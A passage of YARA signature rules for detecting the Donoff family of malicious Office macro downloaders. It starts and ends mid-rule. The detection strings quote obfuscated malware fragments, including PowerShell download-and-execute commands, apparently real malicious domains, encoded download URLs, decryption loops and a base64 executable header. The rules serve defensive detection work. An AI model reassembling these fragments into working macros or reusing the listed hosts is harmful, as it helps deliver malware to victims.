        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= 0 To (64 + 718 + 64 - 718 + 64 + 718 + 64 - 718 - 1)" ascii //weight: 1
        $x_1_2 = "= 0 To (64 + 577 + 64 - 577 + 64 + 577 + 64 - 577 - 1)" ascii //weight: 1
        $x_1_3 = "+ 1) Mod (64 + 313 + 64 - 313 + 64 + 313 + 64 - 313)" ascii //weight: 1
        $x_1_4 = ")) Mod (64 + 658 + 64 - 658 + 64 + 658 + 64 - 658)" ascii //weight: 1
        $x_1_5 = ")) Mod ((64 + 99 + 64 - 99 + 64 + 99 + 64 - 99)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_184
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "+ \").Dow\" + \"nloadF\" + \"ile('\"" ascii //weight: 1
        $x_1_2 = "+ \"ocdoc.exe','%TMP%\\sweezy.exe');\" +" ascii //weight: 1
        $x_1_3 = ".Do^wnlo^adFi^le('ht^tp://" ascii //weight: 1
        $x_1_4 = "'%TEMP%.e^xe') & IF EXIST %TEMP%.e^xe ( s^ta^rt %TEMP%.e^xe) & exit" ascii //weight: 1
        $x_2_5 = {3d 20 53 70 6c 69 74 28 22 05 00 [0-21] 2e 02 00 [0-4] 2f 30 38 37 67 62 64 76 34 22 2c}  //weight: 2, accuracy: Low
        $x_2_6 = {3d 20 53 70 6c 69 74 28 22 05 00 [0-21] 2e 02 00 [0-4] 2f 38 37 38 68 66 33 33 66 33 34 66 2b 05 00 [0-21] 2e 02 00 [0-4] 2f 38 37 38 68 66 33 33 66 33 34 66}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_1_*))) or
            ((1 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_2147689064_185
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {46 75 6e 63 74 69 6f 6e 20 05 00 [0-21] 28 29 0d 0a 05 00 [0-21] 20 3d 20 22 2e 65 78 45 27 22 0d 0a 00}  //weight: 1, accuracy: Low
        $x_1_2 = {46 75 6e 63 74 69 6f 6e 20 05 00 [0-21] 28 29 0d 0a 05 00 [0-21] 20 3d 20 22 27 25 41 50 70 22 0d 0a 00}  //weight: 1, accuracy: Low
        $x_1_3 = {46 75 6e 63 74 69 6f 6e 20 05 00 [0-21] 28 29 0d 0a 05 00 [0-21] 20 3d 20 22 45 78 65 43 75 22 0d 0a 00}  //weight: 1, accuracy: Low
        $x_1_4 = {46 75 6e 63 74 69 6f 6e 20 05 00 [0-21] 28 29 0d 0a 05 00 [0-21] 20 3d 20 22 68 65 5e 4c 4c 22 0d 0a 00}  //weight: 1, accuracy: Low
        $x_1_5 = {46 75 6e 63 74 69 6f 6e 20 05 00 [0-21] 28 29 0d 0a 05 00 [0-21] 20 3d 20 22 63 4d 64 2e 65 22 0d 0a 00}  //weight: 1, accuracy: Low
        $x_1_6 = {46 75 6e 63 74 69 6f 6e 20 05 00 [0-21] 28 29 0d 0a 05 00 [0-21] 20 3d 20 22 68 74 74 70 3a 22 0d 0a 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_186
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "OxiIraNlpCmxVf = (&H3EF + 2892 - &HF3A)" ascii //weight: 1
        $x_1_2 = "BgWEghgQjXdOY = (&H3EF + 2892 - &HF3A)" ascii //weight: 1
        $x_1_3 = "qXDeaovz = LenB(lPyfxw)" ascii //weight: 1
        $x_1_4 = "Do While myejMjcHuN <= qXDeaovz" ascii //weight: 1
        $x_1_5 = "SVgunPR = SVgunPR & Chr(AscB(MidB(lPyfxw, myejMjcHuN, 1)))" ascii //weight: 1
        $x_1_6 = "If BgWEghgQjXdOY > 300 Then" ascii //weight: 1
        $x_1_7 = "If OxiIraNlpCmxVf > 40 * (&H20 + 1142 - &H491) Then" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_187
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 31 20 54 6f 20 39 30 [0-8] 49 66 20 28 [0-16] 28 [0-16] 2c 20 [0-16] 29 20 3d 20 [0-16] 29 20 54 68 65 6e [0-48] 45 78 69 74 20 46 6f 72 [0-8] 45 6e 64 20 49 66}  //weight: 1, accuracy: Low
        $x_1_2 = {20 3d 20 49 49 66 28 [0-16] 20 2d 20 [0-16] 20 3c 3d 20 30 2c 20 39 30 20 2b 20 [0-16] 20 2d 20 [0-16] 2c 20 [0-16] 20 2d 20 [0-16] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {46 75 6e 63 74 69 6f 6e 20 [0-32] 20 3d 20 43 49 6e 74 28 49 6e 74 28 28 [0-8] 20 2a 20 52 6e 64 28 29 29 20 2b 20 [0-16] 29 29 [0-8] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_4 = {46 75 6e 63 74 69 6f 6e 20 [0-32] 20 3d 20 4d 69 64 28 [0-32] 2c 20 31 29 [0-8] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_5 = {41 74 74 72 69 62 75 74 65 20 56 42 5f 4e 61 6d 65 20 3d [0-32] 53 75 62 20 [0-48] 2e 52 75 6e 20 [0-16] 2c 20 30 2c 20 54 72 75 65 [0-8] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_188
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "DFNBPLFC = Kombainer(\"TOOCicroTOOOCoft.XTOOCLHTTPTOOOOCAdodb.TOOOCtrTOCaTOOCTOOOOCTOOOChTOCll.ApplicationTOOOOCWTOOOCcript.TOOOChTOCllTOOOOCProcTOCTOOOCTOOOCTOOOOCGTOCTTOOOOCTTOCTOOCPTOOOOCTypTOCTOOOOCopTOCnTOOOOCwritTOCTOOOOCrTOCTOOOCponTOOOCTOCBody" ascii //weight: 1
        $x_1_2 = "mAshinkazingeraIgolochkuSlomala_to__1.Send" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_189
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "BpCCdvlx5oi(JZ0Es94kx(UAISn), (Fh4zaQvbWYcw8((Fh4zaQvbWYcw8(JPO1YivSoYpgW) + Fh4zaQvbWYcw8(JkiXMm7QT)) Mod ((64 + 742 + 64 - 742 + 64 + 742 + 64 - 742)))))" ascii //weight: 1
        $x_1_2 = "(JPO1YivSoYpgW + Fh4zaQvbWYcw8(UAISn) + MmL5mNbpkuWXS(UAISn Mod (Qa9O(EZ6UtGZkdd) + 1))) Mod ((64 + 746 + 64 - 746 + 64 + 746 + 64 - 746))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_190
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "pi-ym-etacol/ne/moc.dnimxam.www//:sptthlxcJxwNgyhbQsserdda-" ascii //weight: 1
        $x_1_2 = "mtgvnso../o/owTi/wWyemPmixtI/ipw2d:R1c/FcmwZtg.l/oahep" ascii //weight: 1
        $x_1_3 = "o(;  )E.;. -paoEo ZiiMi.MM U;TSv5s9snEldId;ZzW W9Ah0 0NUl/w weslnSn0W" ascii //weight: 1
        $x_1_4 = "Vn n)snzdbelgdx/n..ow hKotataieeo/Coae:(8t/o)'Ogchn.rWh-mbloipy1eeD'(naecentatwoeal ti3Ng.pgTrjxioSt/ecWwn|t" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_191
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "For O9ZeNZMYhnv = 0 To 255" ascii //weight: 1
        $x_1_2 = "A8zOaZ9V8P = (A8zOaZ9V8P + DX9RsbU4jPU(O9ZeNZMYhnv) + JqrgyWe5DKU9fmukX(O9ZeNZMYhnv Mod Len(WHfIWN))) Mod 256" ascii //weight: 1
        $x_1_3 = "YNQFEg7ZKFpt2TkgE = DX9RsbU4jPU(O9ZeNZMYhnv)" ascii //weight: 1
        $x_1_4 = "DX9RsbU4jPU(O9ZeNZMYhnv) = DX9RsbU4jPU(A8zOaZ9V8P)" ascii //weight: 1
        $x_1_5 = "DX9RsbU4jPU(A8zOaZ9V8P) = YNQFEg7ZKFpt2TkgE" ascii //weight: 1
        $x_1_6 = "Next O9ZeNZMYhnv" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_192
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Je11ZTWenE(MutSZPKUlLX) = Je11ZTWenE(MutSZPKUlLX) Xor (MiUfmjWsY((MiUfmjWsY(QnU6ilN) + MiUfmjWsY(WRY09SnfNN)) Mod 256))" ascii //weight: 1
        $x_1_2 = "QnU6ilN = (QnU6ilN + MiUfmjWsY(MutSZPKUlLX) + PqeMkDOpXZU1Fo(MutSZPKUlLX Mod Len(DHMGldOlgx))) Mod 256" ascii //weight: 1
        $x_1_3 = "QnU6ilN = (QnU6ilN + 1) Mod 256" ascii //weight: 1
        $x_1_4 = "WRY09SnfNN = (WRY09SnfNN + MiUfmjWsY(QnU6ilN)) Mod 256" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_193
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Array(\"CM\", \"D.\", \"eX\", \"e \", \"/c\", \" \"\"\", \"P^\", \"Ow\", \"^E\", \"Rs\", \"HE\", \"ll\", \".^\", \"EX\", \"e \", \"  \", \"-^\", \"eX\", \"Ec\", \"U^\", \"TI\", \"ON\", \"^P\", \"ol\", \"IC\", \"Y^\", \"  \", \"B^\", \"Yp\", \"^a\", \"SS\"," ascii //weight: 1
        $x_1_2 = "\".e\", \"xE\", \"')\", \"^;\", \"^S\", \"TA\", \"^R\", \"^T\", \"^-\", \"^p\", \"r^\", \"o^\", \"cE\", \"S^\", \"s \", \"'%\", \"aP\", \"Pd\", \"at\", \"a%\", \".E\", \"XE\"," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_194
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "HcXP7mk9VM1SMh = (HcXP7mk9VM1SMh + YdfhUyQ(Wa20Efxc) + MQi7JysR7YQSo4(Wa20Efxc Mod Len(U8kqrKAr3dtYv))) Mod 256" ascii //weight: 1
        $x_1_2 = "HcXP7mk9VM1SMh = (HcXP7mk9VM1SMh + 1) Mod 256" ascii //weight: 1
        $x_1_3 = "L8SKrS4ATRlJ = (L8SKrS4ATRlJ + YdfhUyQ(HcXP7mk9VM1SMh)) Mod 256" ascii //weight: 1
        $x_1_4 = "HnP2LnWRn(Wa20Efxc) = HnP2LnWRn(Wa20Efxc) Xor (YdfhUyQ((YdfhUyQ(HcXP7mk9VM1SMh) + YdfhUyQ(L8SKrS4ATRlJ)) Mod 256))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_195
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub Document_Open()" ascii //weight: 1
        $x_1_2 = {49 66 20 4d 69 64 28 [0-8] 2c 20 [0-5] 20 2f 20 [0-5] 29 20 3d 20 22 ?? ?? ?? ?? ?? ?? ?? ?? ?? 22 20 54 68 65 6e}  //weight: 1, accuracy: Low
        $x_1_3 = {4d 73 67 42 6f 78 20 22 [0-8] 22 2c 20 [0-8] 2c 20 [0-9] 45 6e 64 20 49 66}  //weight: 1, accuracy: Low
        $x_1_4 = {50 75 62 6c 69 63 20 43 6f 6e 73 74 20 [0-10] 20 3d 20 22 42 41 53 45 36 34 22}  //weight: 1, accuracy: Low
        $x_1_5 = {4d 69 64 28 [0-8] 2c 20 [0-5] 20 2f 20 [0-5] 2c 20 [0-5] 20 2f 20 [0-5] 29}  //weight: 1, accuracy: Low
        $x_1_6 = "Call VBA.Shell(" ascii //weight: 1
        $x_1_7 = " = New MSXML2.DOMDocument" ascii //weight: 1
        $x_1_8 = {53 65 74 20 [0-12] 20 3d 20 [0-12] 2e 20 5f [0-2] 63 72 65 61 74 65 45 6c 65 6d 65 6e 74 20 5f [0-2] 28}  //weight: 1, accuracy: Low
        $x_1_9 = {3d 20 4d 69 64 28 [0-10] 2c 20 [0-5] 20 2d 20 [0-5] 2c 20 [0-5] 20 2d 20 [0-5] 29}  //weight: 1, accuracy: Low
        $x_1_10 = {3d 20 4d 69 64 28 [0-10] 2c 20 2d [0-5] 20 2b 20 [0-5] 2c 20 2d [0-5] 20 2b 20 [0-5] 29}  //weight: 1, accuracy: Low
        $x_1_11 = ".dataType = \"bin.base64\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_196
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Set InTheAfrikaMountainsAreHigh1DASH1solo = CreateObject(InTheAfrikaMountainsAreHighPLAPEKC(3))" ascii //weight: 1
        $x_1_2 = "InTheAfrikaMountainsAreHighDAcdaw.Open InTheAfrikaMountainsAreHighPLAPEKC(5), InTheAfrikaMountainsAreHigh4, False" ascii //weight: 1
        $x_1_3 = "zzeboxu = zzeboxu & uhvucolbi & yhozuco0 & erxaskoba3 & tjynyxyvpo & opcirtycmoch3" ascii //weight: 1
        $x_1_4 = "eaglemouth.org/d5436gh" ascii //weight: 1
        $x_1_5 = "dabihfluky.com/d5436gh" ascii //weight: 1
        $x_1_6 = "fauseandre.net/d5436gh" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_197
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "mynewU = Chr(156 - 52 + 0) & Chr(168 - 52 + 0) & Chr(168 - 52 + 0) & Chr(164 - 52 + 0) & Chr(110 - 52 + 0) & Chr(99 - 52 + 0) & Chr(99 - 52 + 0) & Chr(171 - 52 + 0) & Chr(171 - 52 + 0) & Chr(171 - 52 + 0)" ascii //weight: 1
        $x_1_2 = "Chr(150 - 52 + 0) & Chr(99 - 52 + 0) & Chr(161 - 52 + 0) & Chr(169 - 52 + 0) & Chr(173 - 52 + 0) & Chr(98 - 52 + 0) & Chr(153 - 52 + 0) & Chr(172 - 52 + 0) & Chr(153 - 52 + 0)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_198
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Chr(104) & \"t\" & Chr(116) & Chr(112) & Chr(58) & Chr(47) & Chr(47) & Chr(108) & Chr(111) & \"c\" & Chr(97) & Chr(101) & Chr(118) & Chr(101) & Chr(110) & Chr(100) & Chr(97) & Chr(46) & Chr(99) & Chr(111) & Chr(109) & Chr(47)" ascii //weight: 1
        $x_1_2 = "Chr(52) & Chr(53) & Chr(103) & Chr(51) & Chr(51) & Chr(47) & \"3\" & Chr(52) & Chr(116) & Chr(50) & Chr(100) & Chr(51) & Chr(46) & \"e\" & Chr(120) & Chr(101)" ascii //weight: 1
        $x_1_3 = "\\Mb5k9G0zH.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_199
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "For Hm7oMkeRV = 0 To Len(MaccjxK)" ascii //weight: 1
        $x_1_2 = "YX0g = (YX0g + 1) Mod 256" ascii //weight: 1
        $x_1_3 = "MQQsLu1BTX8Dq0 = (MQQsLu1BTX8Dq0 + L8AKZD66bB7W(YX0g)) Mod 256" ascii //weight: 1
        $x_1_4 = "TSGZbCtxIO = L8AKZD66bB7W(YX0g)" ascii //weight: 1
        $x_1_5 = "L8AKZD66bB7W(YX0g) = L8AKZD66bB7W(MQQsLu1BTX8Dq0)" ascii //weight: 1
        $x_1_6 = "L8AKZD66bB7W(MQQsLu1BTX8Dq0) = TSGZbCtxIO" ascii //weight: 1
        $x_1_7 = "PwLiyYVTCJ9HNF(Hm7oMkeRV) = PwLiyYVTCJ9HNF(Hm7oMkeRV) Xor (L8AKZD66bB7W((L8AKZD66bB7W(YX0g) + L8AKZD66bB7W(MQQsLu1BTX8Dq0)) Mod 256))" ascii //weight: 1
        $x_1_8 = "Next Hm7oMkeRV" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_200
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "& Chr(ByValvDefault(i) - 2 * NothingOrNodeName - 4000 - 900 - 80 - 3)" ascii //weight: 2
        $x_1_2 = "5185, 5197, 5197, 5193, 5139, 5128, 5128, 5188, 5195, 5186, 5196, 5197, 5198, 5195, 5178, 5187, 5127, 5180, 5192, 5190, 5128, 5207," ascii //weight: 1
        $x_1_3 = "5195, 5186, 5196, 5197, 5198, 5195, 5178, 5187, 5130, 5134, 5128, 5136, 5133, 5135, 5132, 5195, 5181," ascii //weight: 1
        $x_1_4 = "5134, 5128, 5136, 5133, 5135, 5132, 5195, 5181, 5128, 5136, 5187, 5184, 5133, 5134, 5127, 5182, 5201, 5182)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_1_*))) or
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_2147689064_201
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"WHERE \" + Ucase(\"nAME liKE 'Python %'\")" ascii //weight: 1
        $x_1_2 = "= Lcase(\"wi\") + Left(\"nmgmts:\\\\" ascii //weight: 1
        $x_1_3 = "= \".\\r\" & StrReverse(\"c\\too\") & Lcase(\"iMV2\")" ascii //weight: 1
        $x_1_4 = "= pirognoe(UserForm1.TextBox1.ControlTipText, \"11\", \"e\")" ascii //weight: 1
        $x_1_5 = "veskonsis = pirognoe(veskonsis, \"bri\", \"s\")" ascii //weight: 1
        $x_1_6 = "N42Wo = Split(UserForm1.Label1.Caption, Qxd7GSg(44))" ascii //weight: 1
        $x_1_7 = "MINEDS = LVAjJDl(MINEDS, \"6ad18d757f22775b45f478f40b80adb3\")" ascii //weight: 1
        $x_1_8 = {68 75 72 69 20 3d 20 46 64 77 59 28 6b 42 29 20 2d 20 63 69 37 0d 0a 74 65 76 6f 33 20 3d 20 74 65 76 6f 33 20 2b 20 54 6f 78 6e 6a 6b 0d 0a 58 6e 74 38 20 3d 20 43 68 72 24 28 68 75 72 69 29}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_202
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {28 36 38 36 30 2c 20 0f 00 2e 0f 00 28 22 5a 34 75 4d 74 67 71 77 6e 62 62 77 66 48 65 79 63 2e 2f 6f 2f 63 6e 78 2e 77 3a 74 54 45 71 71 6e 42 56 4a 57 48 2e 4b 69 76 6d 74 2f 32 70 65 6d 2e 69 61 77 2f 73 74 2f 20 2f 61 4c 30 35 52 58 41 20 35 74 6c 2f 69 31 76 69 67 6f 64 6d 6d 77 2f 70 68 22 29 29 [0-5] 0f 00 2e 0f 00 20 00 2e 01 28 22 6a 4e 52 69 72 65 65 52 30 74 6c 6a 65 48 75 74 76 59 63 4f 64 74 71 65 39 73 67 76 61 73 65 53 22 29 2c 20 00 2e 01 28 22 6e 72 46 65 4f 72 44 65 78 66 4e 65 33 52 22 29 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {75 73 59 73 2e 65 3a 72 69 64 52 64 59 61 35 2d 75 70 44 69 56 2d 39 79 53 6d 38 2d 54 65 75 74 78 61 67 63 6d 6f 62 6c 39 2f 70 6e 46 65 41 2f 57 6d 77 6f 45 63 5a 2e 7a 64 6e 6e 54 69 49 6d 75 78 52 61 4d 6d 50 2e 6d 77 66 77 2e 77 43 2f 33 2f 6a 3a 71 73 4a 70 4b 74 34 74 48 68 22 29 [0-63] 48 65 31 6d 73 2f 36 79 49 74 20 69 74 63 6b 2f 41 31 32 2e 39 32 31 76 35 2f 47 70 42 69 36 6f 6e 65 33 67 75 2f 56 6d 35 6f 36 63 66 2e 4c 64 50 6e 44 69 47 6d 76 78 35 61 6a 6d 35 2e 4a 77 39 77 38 77 63 2f 6d 2f 65 3a 4e 73 46 70 20 74 34 74 70 68 73 20 2f 6f 44 74 54 20 2e 74 4b 63 72 65 4d 6e 3a 6e 53 6f 46 63 71 20 2e 74 73 27 59 6e 51 61 7a 43 22 29 2c 20 39 36 37 35 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147689064_203
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff"
        threat_id = "2147689064"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "K67YzvYoIn = StrConv(LSiVhrkv5Tq(TQE6o4n9dXvRJ9), vbUnicode)" ascii //weight: 1
        $x_1_2 = "K67YzvYoIn(\"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABjWWP7JzgNqCc4DagnOA2oPKWTqDs4Dag8paeoSj" ascii //weight: 1
        $x_1_3 = "RtlMoveMemory CXSnwlOQyHjVTcA(0), Ti3n8exMEia1ob(0), 512" ascii //weight: 1
